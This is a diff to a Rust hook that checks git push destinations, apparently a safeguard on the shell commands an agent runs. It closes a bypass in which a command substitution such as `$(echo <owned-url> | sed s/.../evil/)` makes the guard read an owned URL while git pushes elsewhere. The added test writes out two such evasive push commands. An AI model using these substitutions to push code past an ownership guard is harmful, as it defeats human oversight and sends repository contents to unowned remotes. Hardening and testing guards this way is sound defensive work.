@@ -7,8 +7,8 @@
 use cadence_hooks_core::config::{self, AllowEntry, env_allow_entries, env_extra_hosts};
 use cadence_hooks_core::loop_analysis::{self, ChainAnalysis, LoopAnalysis};
 use cadence_hooks_core::shell::{
-    LOOP_PATTERN, git_push_segments, host_and_repo_from_url, looks_like_push_url, parse_work_dir,
-    strip_quotes,
+    LOOP_PATTERN, carries_substitution, git_push_segments, host_and_repo_from_url,
+    looks_like_push_url, parse_work_dir, strip_quotes,
 };
 use cadence_hooks_core::{Check, CheckResult, HookInput};
 use regex::Regex;
@@ -218,6 +218,21 @@ fn extract_push_targets(
 /// Classify a single destination token as a known remote, an explicit URL, or
 /// neither (a refspec or a typo, which falls back to the tracking remote).
 fn classify_push_target(candidate: &str, work_dir: &str) -> PushTarget {
+    // A destination carrying a command substitution is judged on its text up
+    // to the first blank: the literal part a reader can trust. The tokenizer
+    // keeps `$(echo https://github.com/o/x.git)` whole since
+    // cadence-hooks#1106, and the URL parser would otherwise read an owner out
+    // of the substitution's SOURCE — `$(echo <owned-url> | sed s/o/evil/)`
+    // judged as the owned URL while git pushes wherever the output points.
+    // Cut there, it is the value only the shell knows (#555's nudge).
+    let candidate = if carries_substitution(candidate) {
+        candidate
+            .split([' ', '\t', '\n'])
+            .next()
+            .unwrap_or(candidate)
+    } else {
+        candidate
+    };
     // A configured remote name routes through git's resolution (unchanged).
     // A timed-out remote listing (#271) would silently reclassify a named
     // remote as "no target", shifting *which* remote gets ownership-validated
@@ -1375,6 +1390,27 @@ mod tests {
                 &cwd,
             ));
             assert_eq!(result.outcome, cadence_hooks_core::Outcome::Nudge);
+        });
+    }
+
+    #[test]
+    fn substituted_push_target_is_not_judged_by_its_source_text() {
+        // cadence-hooks#1106 keeps the substitution whole; its SOURCE names an
+        // owned URL, but git pushes wherever the OUTPUT points.
+        with_env(&owners_only(), || {
+            let repo = crate::github_origin_repo();
+            let cwd = repo.path().to_string_lossy();
+            for command in [
+                "git push $(echo https://github.com/cameronsjo/x.git | sed s/cameronsjo/evil/) main",
+                "git push `echo https://github.com/cameronsjo/x.git | sed s/c/e/` main",
+            ] {
+                let result = PushRemoteGuard.run(&make_bash_with_cwd(command, &cwd));
+                assert_eq!(
+                    result.outcome,
+                    cadence_hooks_core::Outcome::Nudge,
+                    "{command}"
+                );
+            }
         });
     }
 
